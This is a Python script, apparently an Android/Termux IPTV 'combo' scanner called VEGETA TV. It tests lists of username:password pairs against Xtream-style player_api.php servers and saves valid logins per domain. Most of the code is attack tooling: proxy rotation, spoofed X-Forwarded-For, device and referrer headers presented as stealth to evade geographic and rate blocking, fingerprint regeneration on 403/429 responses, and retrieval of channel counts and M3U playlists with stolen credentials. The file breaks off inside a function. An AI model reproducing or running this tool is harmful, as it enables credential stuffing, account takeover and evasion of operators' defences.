# ===================== IMPORTS ET UTILITAIRES =====================
import os
import sys
import time
import datetime
import threading
import queue
import random
import subprocess
import socket
try:
    import androidhelper
    ad = androidhelper.Android()
except:
    ad = None
    
# Tentative d'import de requests avec installation automatique si nécessaire
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Bibliothèque 'requests' non trouvée. Installation en cours...")
    try:
        # Installation avec support SOCKS
        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests[socks]"])
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        print("Bibliothèque 'requests' installée avec succès (avec support SOCKS)!")
    except Exception as e:
        print(f"Échec de l'installation de 'requests': {e}")
        print("Veuillez installer manuellement: pip install requests[socks]")
        sys.exit(1)
        
# ===================== CHEMINS =====================
BASE_DIR = '/sdcard' if os.path.isdir('/sdcard') else '/storage/emulated/0'

OUT_DIR        = os.path.join(BASE_DIR, 'VΞGΞТΛ⚡₸V')
COMBO_DIR      = os.path.join(BASE_DIR, 'combo')      # combos à tester
COMBO_HITS_DIR = os.path.join(OUT_DIR, 'COMBO')       # combos trouvés (hits)
ALARM_DIR      = os.path.join(OUT_DIR, 'Alarm')       # dossier pour ven_tv.mp3
DOMAINS_FILE   = os.path.join(OUT_DIR, "domains.txt")
PROXY_DIR      = os.path.join(OUT_DIR, "proxys")

# Création auto des dossiers au lancement
os.makedirs(OUT_DIR, exist_ok=True)
os.makedirs(COMBO_DIR, exist_ok=True)
os.makedirs(COMBO_HITS_DIR, exist_ok=True)
os.makedirs(ALARM_DIR, exist_ok=True)
os.makedirs(PROXY_DIR, exist_ok=True)

HIT_SOUND_PATH = os.path.join(ALARM_DIR, "ven_TV.mp3")

# === Suivi HTTP des serveurs pour le statut dans le panel ===
_SERVER_HTTP_STATUS = {}
_SERVER_HTTP_STATUS_LOCK = threading.Lock()
# Pour éviter de lancer plusieurs watchers pour le même serveur
_SERVER_STATUS_WATCHERS = {}

def _simple_status_request(url: str, timeout: float = 4.0):
    """
    Requête ultra simple pour récupérer le code HTTP réel.
    Ne passe PAS par _get_with_retry (qui filtre les codes != 200).
    """
    try:
        return requests.get(
            url,
            headers={
                "User-Agent": "Mozilla/5.0",
                "Accept": "*/*",
                "Connection": "close",
            },
            timeout=timeout,
            allow_redirects=False,
            verify=False,
        )
    except Exception:
        return None


def _check_server_status_for_panel(server: str, proxy=None, timeout: int = 5):
    """
    Version VEGETA inspirée de VΞNGΞANCΞ:
    - utilise une requête directe pour récupérer le code HTTP
    - 404 est traité comme redirection
    - enregistre une chaîne lisible dans _SERVER_HTTP_STATUS.
    """
    if not server:
        return

    hostport = server.replace("http://", "").replace("https://", "").split("/", 1)[0]
    url = f"http://{hostport}/"

    resp = None
    try:
        # on NE passe plus par _get_with_retry pour ne pas perdre les 403/404
        resp = _simple_status_request(url, timeout=timeout)
    except Exception:
        resp = None

    txt = "OFFLINE"
    code = getattr(resp, "status_code", None) if resp is not None else None

    if code is None:
        txt = "OFFLINE"
    else:
        if 200 <= code < 300:
            txt = f"ONLINE {code}"
        elif code == 404:
            txt = "REDIRECT 404"
        elif 300 <= code < 400:
            txt = f"REDIRECT {code}"
        elif code in (401, 403, 429):
            txt = f"PROTECTED {code}"
        elif 400 <= code < 500:
            txt = f"CLIENT_ERROR {code}"
        elif 500 <= code < 600:
            txt = f"SERVER_ERROR {code}"
        else:
            txt = f"HTTP {code}"

    try:
        with _SERVER_HTTP_STATUS_LOCK:
            _SERVER_HTTP_STATUS[server] = txt
    except Exception:
        pass
        
def background_status_refresher(server: str, interval: int = 15, proxy=None):
    """
    Thread en tâche de fond : toutes les `interval` secondes,
    envoie une petite requête de statut indépendante des combos.
    """
    while not _stop_early.is_set():
        try:
            _check_server_status_for_panel(server, proxy=proxy, timeout=5)
        except Exception:
            # on ne casse jamais le scanner pour une erreur de statut
            pass

        # Sleep fractionné pour réagir vite à l'arrêt
        total = max(1, int(interval * 10))  # 10 ticks par seconde
        for _ in range(total):
            if _stop_early.is_set():
                break
            # on respecte éventuellement la pause globale
            if _pause_scan.is_set():
                time.sleep(0.1)
            else:
                time.sleep(0.1)
                
from collections import defaultdict  # à mettre en haut du fichier
# Panels: ne JAMAIS recalculer IP/Géo/Catégories – prendre uniquement du HIT

# ===================== ÉTATS GLOBAUX =====================
_display_lock = threading.Lock()
_RESULTS_LOCK = threading.Lock()

def _safe_filename(name: str) -> str:
    """
    Nettoie un nom (domaine) pour pouvoir l'utiliser comme nom de fichier.
    Exemple: 'http://canal-pro.xyz:8080' -> 'canal-pro.xyz'
    """
    if not name:
        return "unknown"

    # on garde seulement la partie host
    host = name.split("//")[-1]
    host = host.split("/")[0]
    host = host.split(":")[0]

    # on remplace les caractères dangereux
    forbidden = ['/', '\\', ':', '*', '?', '"', '<', '>', '|']
    for ch in forbidden:
        host = host.replace(ch, '_')

    host = host.strip()
    return host or "unknown"

def save_combo_for_server(server: str, user: str, pwd: str):
    """
    Sauvegarde un hit sous la forme user:pass dans un fichier :
    VΞGΞТΛ⚡₸V/COMBO/<domaine>.txt
    Exemple: http://canal-pro.xyz:8080 -> COMBO/canal-pro.xyz.txt
    """
    try:
        # extrait le host du server (ex: "tvbulk.icu" depuis "tvbulk.icu:8080")
        if "://" in server:
            host = server.split("://", 1)[1]
        else:
            host = server
        host = host.split("/")[0]
        host = host.split(":")[0]

        safe_host = _safe_filename(host)
        filename = f"{safe_host}.txt"

        # s'assurer que le dossier des combos HITS existe
        os.makedirs(COMBO_HITS_DIR, exist_ok=True)
        path = os.path.join(COMBO_HITS_DIR, filename)

        line = f"{user}:{pwd}\n"
        with open(path, "a", encoding="utf-8") as f:
            f.write(line)
    except Exception:
        # on ne casse jamais le scan pour un problème d'écriture disque
        pass

ALARM_ENABLED = True  # si tu veux pouvoir couper plus tard

def hit_alarm():
    """Lecture du son ven_tv.mp3 sur Android/Termux, fallback bip console."""
    if not ALARM_ENABLED:
        return

    sound = HIT_SOUND_PATH
    try:
        # 1) Android SL4A / QPython
        global ad
        if ad and os.path.exists(sound):
            try:
                ad.mediaPlay(sound)
                return
            except:
                pass

        # 2) Termux (si dispo)
        if os.path.exists(sound):
            try:
                os.system(f'termux-media-player play \"{sound}\" >/dev/null 2>&1 &')
                return
            except:
                pass

        # 3) Fallback console (bip)
        try:
            sys.stdout.write('\a')
            sys.stdout.flush()
        except Exception:
            pass

    except Exception:
        try:
            sys.stdout.write('\a')
            sys.stdout.flush()
        except Exception:
            pass
                                    
_start = time.time()
_last_hit_message = ""
# Pause / Reanudar
_pause_scan = threading.Event()     # ⏸️ si set() => pause combos
_stop_combos_s1 = threading.Event()   # stop des combos pour Escaneo #1
_stop_combos_s2 = threading.Event()   # stop des combos pour Escaneo #2
SERVER_INDEX = {}                     # mapping: "host:port" -> 1 ou 2

def _is_scan_stopped_for_server(server: str) -> bool:
    idx = SERVER_INDEX.get(server, 0)
    return (idx == 1 and _stop_combos_s1.is_set()) or (idx == 2 and _stop_combos_s2.is_set())
# Flags clavier
_stop_early = threading.Event()            # 'f' : arrêt global
_stop_parallel = threading.Event()         # 'v' : stop domaines parallèles
_stop_after_parallel = threading.Event()   # usado por 1/2: esperar la fin de dominios paralelos
# (assure-toi d'avoir aussi:)
# _stop_combos = threading.Event()

# --- Analyse domaines parallèles : par serveur (multi-scan) ---
DOMAIN_WORKERS = 30

# === Emission progressive des résultats ===
EMIT_Q = queue.Queue()                     # file d'émission (sauvegardes progressives)

# Multi-hits par serveur
HITS_BY_ID = {}                             # hit_id -> hit_info
HITS_BY_SERVER = defaultdict(list)          # server -> [hit_id, hit_id, ...]

class ScanState:
    def __init__(self, key):
        self.key = key              # ex: "dominio.tld:8080"
        self.results = []           # URLs actifs trouvés (http://dom:port)
        self.live = []              # derniers trouvés pour l’aperçu live
        self.total = 0              # nb de domaines à tester
        self.done = 0               # nb déjà testés
        self.started = threading.Event()
        self.finished = threading.Event()
        self.task_q = None          # ✅ mémorise la queue de ce scan parallèle
        
PARALLEL_SCANS = {}    
_PARALLEL_DONE = threading.Event()
_stop_combos = threading.Event() 
# Catégories "référence" par serveur (normalisées)
BASELINE_CATS = {}  # server_key -> set(str)             # key -> ScanState (un par serveur)

# --- Affichage "live" (on agrège tout) ---
_PARALLEL_LIVE_MAX = 3              # nb max de lignes live

# --- Stockage résultats/affichage final ---
_FINAL_RESULTS = []                       # textes finaux à imprimer/sauver
_BASE_HITS = []                           # bases de hits (sans domaines)

# === PROXY UI STATE (pour l'affichage du panel) ===
PROXY_FILE_NAME = "Aucun"
PROXIES_TOTAL = 0
PROXIES_USED_SET = set()
CURRENT_PROXY_DISPLAY = "—"

def _mask_proxy(p: str) -> str:
    
    try:
        if not p:
            return "—"

        s = p.strip()
        scheme = ""
        rest = s

        # Extraire schéma si présent
        if "://" in s:
            scheme, rest = s.split("://", 1)

        # Masquer login:pass si présent
        if "@" in rest:
            rest = rest.split("@", 1)[1]

        # Reconstruire proprement
        if scheme:
            return f"{scheme}://{rest}"
        return rest
    except Exception:
        return "—"        
# ===================== ASCII / UI =====================
VEGETA_ASCII = """⠀⠀
█░█ █▀▀ █▀▀ █▀▀ ▀█▀ ▄▀█   ▀█▀ █░█      
▀▄▀ ██▄ █▄█ ██▄ ░█░ █▀█   ░█░ ▀▄▀     
by kheliH and igor      ⠀⠀
"""

_blink_index  = 0
_panel_index  = 0
_spin_index   = 0

_blink_colors = [
    '\x1b[1;96m',  # jaune vif
]
_colors = ['\x1b[94m', '\x1b[93m', '\x1b[96m', '\x1b[95m']
_SPIN = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']

# ===================== UTILITAIRES =====================
def _bar(p, L=36):
    try:
        p = 0.0 if not p else max(0.0, min(1.0, float(p)))
        n = int(L * p)
        return '█' * n + '░' * (L - n)
    except:
        return '░' * L

# --- Hits cascade (derniers 5) ---
from collections import deque
HIT_CASCADE = deque(maxlen=3)

def _shorten(text, max_len=10):
    """Raccourcit et ajoute ** si trop long."""
    try:
        if not text:
            return ""
        return text if len(text) <= max_len else text[:max_len] + "**"
    except Exception:
        return str(text)[:max_len] + "**"
        
def _strip_scheme(host: str) -> str:
    if not host:
        return ""
    return host.replace('http://', '').replace('https://', '').replace('/', '').strip()

def _format_ts(ts):
    if not ts:
        return '---'
    try:
        ts = int(float(ts))
        if ts < 10000000:
            return str(ts)
        return datetime.datetime.fromtimestamp(ts).strftime('%d/%m/%Y %H:%M:%S')
    except:
        return str(ts)

def _days_left(exp_ts):
    if not exp_ts:
        return '—'
    try:
        ts = int(float(exp_ts))
        if ts < 10000000:
            return '—'
        d = int(max(0, (ts - time.time()) / 86400))
        return str(d)
    except:
        return '—'

def _country_flag(cc=""):
    try:
        cc = (cc or "").upper()
        if len(cc) != 2 or not cc.isalpha():
            return ""
        base = 0x1F1E6
        return chr(base + ord(cc[0]) - ord('A')) + chr(base + ord(cc[1]) - ord('A'))
    except Exception:
        return ""

def resolve_ip(host: str) -> str:
    """Résout IPv4/IPv6 → retourne la première IP."""
    try:
        info = socket.getaddrinfo(host.strip(), None)
        for _, _, _, _, sockaddr in info:
            ip = sockaddr[0]
            if ip:
                return ip
    except Exception:
        pass
    try:
        return socket.gethostbyname(host)
    except Exception:
        return ""

def geo_lookup(ip: str) -> dict:
    """Essaye ip-api.com → ipwho.is → ipapi.co. Retourne {city,region,country,countryCode,isp}."""
    std = dict(city="", region="", country="", countryCode="", isp="")
    if not ip:
        return std

    # 1) ip-api.com
    try:
        r = _get_with_retry(
            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,isp",
            timeout=10
        )
        j = r.json() if r is not None else {}
        if j.get("status") == "success":
            return {
                "city": j.get("city", "") or "",
                "region": j.get("regionName", "") or "",
                "country": j.get("country", "") or "",
                "countryCode": j.get("countryCode", "") or "",
                "isp": j.get("isp", "") or "",
            }
    except Exception:
        pass

    # 2) ipwho.is
    try:
        r = _get_with_retry(f"https://ipwho.is/{ip}", timeout=10)
        j = r.json() if r is not None else {}
        if j.get("success"):
            return {
                "city": j.get("city", "") or "",
                "region": j.get("region", "") or "",
                "country": j.get("country", "") or "",
                "countryCode": j.get("country_code", "") or "",
                "isp": j.get("connection", {}).get("isp", "") or "",
            }
    except Exception:
        pass

    # 3) ipapi.co
    try:
        r = _get_with_retry(f"https://ipapi.co/{ip}/json/", timeout=10)
        j = r.json() if r is not None else {}
        if not j.get("error"):
            return {
                "city": j.get("city", "") or "",
                "region": j.get("region", "") or "",
                "country": j.get("country_name", "") or "",
                "countryCode": j.get("country", "") or "",
                "isp": j.get("org", "") or "",
            }
    except Exception:
        pass

    return std

def describe_geo(geo: dict) -> str:
    try:
        city = geo.get("city") or ""
        region = geo.get("region") or ""
        country = geo.get("country") or ""
        cc = geo.get("countryCode") or ""
        flag = _country_flag(cc)
        parts = [p for p in [city, region, country] if p]
        where = ", ".join(parts) if parts else country or "—"
        return f"{where} {flag}".strip()
    except Exception:
        return "—"

def _norm_txt(s):
    # normalise: minuscules + garde seulement alphanum (évite accents/espaces)
    try:
        s = (s or "").lower()
        return "".join(ch for ch in s if ch.isalnum())
    except Exception:
        return ""

def get_live_category_names(server, user, pwd, timeout=8):
    """
    Retourne la LISTE brute des noms de catégories Live (pas une chaîne jointe).
    Utilise player_api.php?action=get_live_categories.
    """
    try:
        url = ('http://{srv}/player_api.php?username={u}&password={p}'
               '&action=get_live_categories').format(srv=server, u=user, p=pwd)
        data = fetch_json(url, timeout=timeout, server=server)
        if not data or not isinstance(data, list):
            return []
        names = []
        for c in data:
            name = c.get("category_name")
            if name:
                names.append(str(name))
        return names
    except Exception:
        return []

def _cats_to_set(names):
    # Transforme une liste de labels -> set de labels normalisés
    try:
        return set(_norm_txt(n) for n in names if n)
    except Exception:
        return set()

def _cats_similar(base_set, cand_set):
    """
    Critère simple et robuste: accepte si ≥3 catégories en commun
    OU Jaccard >= 0.55 (et au moins 2 en commun).
    """
    if not base_set or not cand_set:
        return False
    inter = len(base_set.intersection(cand_set))
    uni   = len(base_set.union(cand_set))
    jacc  = (float(inter) / float(uni)) if uni else 0.0
    return (inter >= 3) or (inter >= 2 and jacc >= 0.55)
# ===================== LECTURE DOMAINS.TXT =====================
def load_domains():
    try:
        with open(DOMAINS_FILE, "r", encoding="utf-8") as f:
            return [d.strip() for d in f if d.strip() and not d.startswith("#")]
    except Exception as e:
        print(f"\x1b[31m[ERREUR]\x1b[0m Impossible de charger domains.txt: {e}")
        return []
# ===================== HEADERS & FETCH =====================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0",
]

ACCEPT_LANGS = ["en-US,en;q=0.9", "pt-BR,pt;q=0.9", "es-ES,es;q=0.9"]
REFERERS = [
    "http://www.google.com/",
    "http://www.bing.com/",
    "http://www.duckduckgo.com/",
    "http://www.yahoo.com/",
]

COOKIE_STORE = {}

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Referer": random.choice(REFERERS),
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
    }

def get_cookies(server):
    if server not in COOKIE_STORE:
        COOKIE_STORE[server] = {
            "sessionid": str(random.randint(100000, 999999)),
            "csrf_token": f"token_{random.randint(1000, 9999)}",
            "lang": random.choice(["en", "fr", "es", "pt"]),
        }
    return COOKIE_STORE[server]

# ===================== FONCTIONS PROXY =====================
def choose_proxy_file():
    """Permet à l'utilisateur de choisir un fichier proxy + détecte le type via le nom."""
    try:
        files = [f for f in os.listdir(PROXY_DIR) if os.path.isfile(os.path.join(PROXY_DIR, f))]
        if not files:
            print("\x1b[1;33mAucun fichier proxy trouvé dans le dossier 'proxys'. Scan sans proxy.\x1b[0m")
            return (None, None)

        print("\n\x1b[1;34mFichiers proxy disponibles:\x1b[0m")
        print("\x1b[1;33m0➠ Scan sans proxy\x1b[0m")
        for i, f in enumerate(files, 1):
            print(f"\x1b[1;33m{i}➠ {f}  \x1b[0m")

        def _detect_kind_from_filename(fname: str):
            n = (fname or "").lower()
            # tolérances: "soc5", "sock5", etc.
            if ("socks5" in n) or ("sock5" in n) or ("soc5" in n) or ("s5" in n):
                return "socks5"
            if ("socks4" in n) or ("sock4" in n) or ("soc4" in n) or ("s4" in n):
                return "socks4"
            if ("http" in n) or ("https" in n):
                return "http"
            if ("all" in n) or ("mix" in n) or ("multi" in n):
                return "auto"
            return "auto"

        while True:
            try:
                choice = int(input("\n\x1b[1;96mChoisis un proxy (0 pour sans proxy) ➜ \x1b[0;33m"))
                if choice == 0:
                    return (None, None)
                elif 1 <= choice <= len(files):
                    proxy_name = files[choice - 1]
                    proxy_path = os.path.join(PROXY_DIR, proxy_name)
                    proxy_kind = _detect_kind_from_filename(proxy_name)
                    return (proxy_path, proxy_kind)
                else:
                    print("\x1b[1;31mChoix invalide.\x1b[0m")
            except ValueError:
                print("\x1b[1;31mPlease enter a number.\x1b[0m")
            except (KeyboardInterrupt, EOFError):
                print("\n\x1b[1;31mInput interrupted.\x1b[0m")
                return (None, None)
    except Exception as e:
        print(f"\x1b[1;31mError selecting proxy: {e}\x1b[0m")
        return (None, None)
        
def load_proxies(proxy_path):
    """Charge les proxies depuis un fichier (conserve socks4/socks4a/socks5/socks5h)."""
    proxies = []
    if not proxy_path:
        return proxies

    try:
        with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = (line or "").strip()
                if not line or line.startswith('#'):
                    continue

                # Si la ligne a un schéma
                if '://' in line:
                    low = line.lower()
                    # garder les schémas SOCKS si présents
                    if low.startswith(("socks4://", "socks4a://", "socks5://", "socks5h://")):
                        proxies.append(line)
                        continue
                    # sinon (http/https/etc), on enlève le schéma
                    line = line.split('://', 1)[1].strip()

                proxies.append(line)

        print(f"\x1b[1;32m✅ {len(proxies)} proxies chargés depuis {os.path.basename(proxy_path)}\x1b[0m")
    except Exception as e:
        print(f"\x1b[1;31mErreur lecture proxy: {e}\x1b[0m")

    return proxies
    
def get_random_proxy(proxies_list, proxy_kind="auto"):
    """
    Retourne un proxy sous format requests.
    - Si proxy_kind='socks5' -> force socks5h://
    - Si proxy_kind='socks4' -> force socks4a://
    - Si proxy_kind='http'   -> force http://
    - Si proxy_kind='auto'   -> respecte un schéma présent, sinon http:// par défaut
    """
    if not proxies_list:
        return None

    proxy_str = (random.choice(proxies_list) or "").strip()
    if not proxy_str:
        return None

    low = proxy_str.lower()

    # 1) Si la ligne contient déjà un schéma SOCKS, on l'honore (et on force h/a si nécessaire)
    if low.startswith("socks5h://"):
        return proxy_str
    if low.startswith("socks5://"):
        return "socks5h://" + proxy_str[len("socks5://"):]
    if low.startswith("socks4a://"):
        return proxy_str
    if low.startswith("socks4://"):
        return "socks4a://" + proxy_str[len("socks4://"):]

    # 2) Si la ligne contient déjà http/https, on garde
    if low.startswith("http://") or low.startswith("https://"):
        return proxy_str

    # 3) Ici on a un format "ip:port" ou "user:pass@ip:port"
    kind = (proxy_kind or "auto").lower()

    if kind == "socks5":
        return f"socks5h://{proxy_str}"
    if kind == "socks4":
        return f"socks4a://{proxy_str}"
    if kind == "http":
        # si auth
        if "@" in proxy_str:
            auth, server = proxy_str.split("@", 1)
            return f"http://{auth}@{server}"
        return f"http://{proxy_str}"

    # auto: comportement original -> http://
    if "@" in proxy_str:
        auth, server = proxy_str.split("@", 1)
        return f"http://{auth}@{server}"
    return f"http://{proxy_str}"
            
# === Watcher de fichier proxy (live refresh) ===
_proxy_watch_stop = threading.Event()
_proxy_watch_thread = None

def _clean_proxy_line(line: str):
    line = (line or "").strip()
    if not line or line.startswith("#"):
        return None

    low = line.lower()
    # Conserver tous les schémas SOCKS
    if low.startswith(("socks4://", "socks4a://", "socks5://", "socks5h://")):
        return line

    # Supprimer uniquement http:// et https://
    if low.startswith("http://"):
        return line[7:]
    if low.startswith("https://"):
        return line[8:]

    return line
        
def _read_proxy_file(path: str):
    out = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for ln in f:
                ln = _clean_proxy_line(ln)
                if ln:
                    out.append(ln)
    except Exception:
        pass
    return out

def start_proxy_file_watcher(proxy_path: str, proxies_list: list, interval: float = 2.0):
    """
    Surveille 'proxy_path' et:
      - met à jour PROXIES_TOTAL avec le nombre de lignes valides du fichier
      - ajoute les nouveaux proxys dans 'proxies_list' *sans recréer l'objet*
    """
    if not proxy_path:
        return
    def _run():
        last_snapshot = None
        while not _proxy_watch_stop.is_set():
            try:
                current = _read_proxy_file(proxy_path)
                snap = tuple(current)  # pour comparer simplement
                if snap != last_snapshot:
                    last_snapshot = snap
                    with _display_lock:
                        # 1) compteur pour l'UI = contenu du fichier
                        global PROXIES_TOTAL
                        PROXIES_TOTAL = len(current)

                        # 2) injection des nouveaux proxys dans la liste partagée
                        existing = set(proxies_list)
                        to_add = [p for p in current if p not in existing]
                        if to_add:
                            proxies_list.extend(to_add)
                time.sleep(max(0.3, float(interval)))
            except Exception:
                time.sleep(max(0.3, float(interval)))
    global _proxy_watch_thread
    _proxy_watch_stop.clear()
    _proxy_watch_thread = threading.Thread(target=_run, daemon=True)
    _proxy_watch_thread.start()

def stop_proxy_file_watcher():
    try:
        _proxy_watch_stop.set()
    except Exception:
        pass
                
# ===================== SESSIONS FURTIVES =====================
_thread_local = threading.local()

# ================== SPOOF IP / GEO / DEVICE / REFERRER ==================

def _generate_plausible_ip():
    """
    Génère une adresse IPv4 publique réaliste (évite les plages privées et réservées).
    Utilisé pour le header X-Forwarded-For.
    """
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)

        # Plages privées / réservées
        if a == 10:
            continue
        if a == 127:
            continue
        if a == 192 and b == 168:
            continue
        if a == 172 and 16 <= b <= 31:
            continue
        if a >= 224:
            continue

        return f"{a}.{b}.{c}.{d}"


def _get_region_specific_lang():
    """
    Retourne un header 'Accept-Language' cohérent avec une localisation régionale.
    """
    langs = [
        'fr-FR,fr;q=0.9',
        'en-US,en;q=0.9',
        'pt-BR,pt;q=0.9',
        'es-ES,es;q=0.9',
        'de-DE,de;q=0.9',
        'it-IT,it;q=0.9',
        'pl-PL,pl;q=0.9',
        'nl-NL,nl;q=0.9',
        'ro-RO,ro;q=0.9',
        'ar-SA,ar;q=0.9'
    ]
    return random.choice(langs)


def _geo_spoofing_headers():
    """
    Contournement des restrictions géographiques (HTTP layer spoof).
    Injecte des en-têtes d'origine simulée.
    """
    return {
        'X-Forwarded-For': _generate_plausible_ip(),
        'Accept-Language': _get_region_specific_lang(),
        'X-Client-Region': random.choice(['US', 'FR', 'DE', 'GB', 'PT', 'ES', 'IT', 'NL', 'BR', 'AR']),
    }


def _device_spoof_headers():
    """
    Simule un device/app différent pour chaque session.
    """
    return {
        "X-Device-ID": f"dev_{random.randint(100000, 999999)}",
        "X-App-Version": random.choice(["5.1.2", "6.0.0", "7.3.4"]),
        "X-Platform": random.choice(["android", "tv", "mobile"]),
    }


def _referrer_spoof_headers():
    """
    Simule des origines de navigation 'normales' (search, portails, etc.).
    """
    return {
        "Referer": random.choice([
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://duckduckgo.com/",
            "https://iptv-search.net/",
        ]),
        "Origin": random.choice([
            "https://www.google.com",
            "https://iptvhub.net",
            "https://search.yahoo.com"
        ])
    }


def _apply_geo_spoofing(session):
    """
    Fusionne les en-têtes de géo-spoofing + device + referrer
    avec les headers existants de la session.
    Appelée à la création et éventuellement lors de rotations.
    """
    try:
        spoof = {}
        spoof.update(_geo_spoofing_headers())
        spoof.update(_device_spoof_headers())
        spoof.update(_referrer_spoof_headers())
        session.headers.update(spoof)
    except Exception:
        pass


# ================== HOOK DE RÉPONSE (ADAPTATIF) ==================

def _response_hook(response, *args, **kwargs):
    """
    Hook pour analyser les réponses et ajuster le comportement de la session du thread.
    """
    s = getattr(_thread_local, "session", None)
    if s is not None:
        # init metrics si besoin
        if not hasattr(s, "metrics"):
            s.metrics = {"total_requests": 0, "failed_requests": 0}
        if not hasattr(s, "ua_rotate_every"):
            s.ua_rotate_every = 30  # valeur de base

        s.metrics["total_requests"] += 1
        if not response.ok:
            s.metrics["failed_requests"] += 1

        failure_rate = s.metrics["failed_requests"] / max(1, s.metrics["total_requests"])

        # Si >30% d'échecs, on "durcit" un peu le camouflage :
        if failure_rate > 0.30:
            s.ua_rotate_every = max(10, s.ua_rotate_every - 5)
            # on rafraîchit les headers UA + spoofing
            try:
                s.headers.update(get_headers())
                _apply_geo_spoofing(s)
            except Exception:
                pass

    return response


# ================== SESSIONS FURTIVES PAR THREAD ==================

def _build_new_session(server=None, proxy=None):
    """
    Crée une nouvelle session HTTPS furtive pour CE THREAD.
    """
    s = requests.Session()
    # UA / headers de base
    s.headers.update(get_headers())
    # Ajout du spoofing géo + device + referer
    _apply_geo_spoofing(s)

    # Cookies simulés par serveur
    if server:
        s.cookies.update(get_cookies(server))

    # Proxy éventuel
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}

    # Métriques pour le hook adaptatif
    s.metrics = {"total_requests": 0, "failed_requests": 0}
    s.ua_rotate_every = 30

    # Hook réponse
    try:
        s.hooks["response"].append(_response_hook)
    except Exception:
        s.hooks["response"] = [_response_hook]

    # Stockage thread-local
    _thread_local.session = s
    _thread_local.session_server = server
    _thread_local.session_proxy = proxy
    return s


def get_session(server=None, proxy=None):
    """
    Retourne la session furtive du thread, ou en crée une nouvelle si
    changement de serveur/proxy.
    """
    cur = getattr(_thread_local, "session", None)
    cur_srv = getattr(_thread_local, "session_server", None)
    cur_proxy = getattr(_thread_local, "session_proxy", None)

    if cur is None or cur_srv != server or cur_proxy != proxy:
        cur = _build_new_session(server, proxy)
    return cur


def init_thread_fingerprint(server=None, proxy=None):
    """
    Force la création d'une nouvelle session pour ce thread
    (nouvel UA, nouveaux cookies, nouveau spoof IP/geo/device).
    """
    return _build_new_session(server, proxy)
    
# Statuts qui déclenchent un retry
_RETRY_STATUS = {403, 429, 503}

def _get_with_retry(url, server=None, timeout=10, proxy=None):
    """
    GET furtif avec retry sur certains status (403/429/503).
    Retourne un objet Response ou None.
    """
    session = get_session(server, proxy)
    try:
        r = session.get(url, timeout=_effective_timeout(timeout), verify=False)
    except Exception:
        # échec réseau → on réinitialise l'empreinte et on retente une fois
        init_thread_fingerprint(server, proxy)
        try:
            session = get_session(server, proxy)
            r = session.get(url, timeout=_effective_timeout(timeout), verify=False)
        except Exception:
            return None

    if r is None:
        return None

    # Si statut "bloquant" → on regénère la session et on retente une fois
    try:
        code = getattr(r, "status_code", None)
    except Exception:
        code = None

    if code in _RETRY_STATUS:
        init_thread_fingerprint(server, proxy)
        try:
            session = get_session(server, proxy)
            r2 = session.get(url, timeout=_effective_timeout(timeout), verify=False)
            return r2
        except Exception:
            # on garde au moins la première réponse
            return r

    return r


def fetch_json(url, timeout=15, server=None, proxy=None):
    """
    GET JSON furtif.
    Utilisé par check_target / domaines parallèles.
    (Le statut HTTP pour le panel est maintenant géré par le watcher dédié.)
    """
    try:
        r = _get_with_retry(url, server=server, timeout=timeout, proxy=proxy)
        if r is not None and getattr(r, "status_code", 0) == 200:
            try:
                return r.json()
            except Exception:
                return None
        return None
    except Exception:
        return None
                
def _sleep_until_or_stop(total, step=0.05):
    end = time.time() + max(0.0, total)
    while time.time() < end:
        # si un stop global, ou stop combos, ou stop parallèles → on coupe direct
        if _stop_early.is_set() or _stop_parallel.is_set() or _stop_combos.is_set():
            return
        time.sleep(min(step, end - time.time()))
        
def _wait_while_paused(step=0.1):
    # attend la reprise sans bloquer F/V/1/2
    while _pause_scan.is_set():
        if _stop_early.is_set():
            return
        time.sleep(step)
                
_CANCEL_PARALLEL_TO = 0.6  # mets 0.3 pour un arrêt encore plus sec
def _effective_timeout(t):
    if _stop_parallel.is_set():
        try:
            return min(float(t), float(_CANCEL_PARALLEL_TO))
        except Exception:
            return 0.6
    return t
    
def fetch_counts(server, user, pwd):
    try:
        base = f'http://{server}/player_api.php?username={user}&password={pwd}'
        canais = fetch_json(base + '&action=get_live_streams', server=server) or []
        filmes = fetch_json(base + '&action=get_vod_streams', server=server) or []
        series = fetch_json(base + '&action=get_series', server=server) or []
        return (len(canais), len(filmes), len(series))
    except:
        return (0, 0, 0)

# ===================== GET M3U FALLBACK (utilitaires) =====================
import re

# ===================== GET M3U FALLBACK (utilitaires) =====================
import re

def _safe_text(b, encodings=("utf-8", "latin-1")):
    if isinstance(b, str):
        return b
    for enc in encodings:
        try:
            return b.decode(enc, errors="ignore")
        except Exception:
            pass
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        return str(b)

def download_m3u_text(server_hostport, user, pwd, timeout=4):
    """
    Fallback GET M3U: tente plusieurs variantes de get.php et renvoie le texte M3U.
    Retry automatique (403/429/503) avec régénération d’empreinte par thread.
    """
    base = f"http://{server_hostport}"
    urls = [
        f"{base}/get.php?username={user}&password={pwd}&type=m3u",
        f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus",
        f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus&output=ts",
    ]
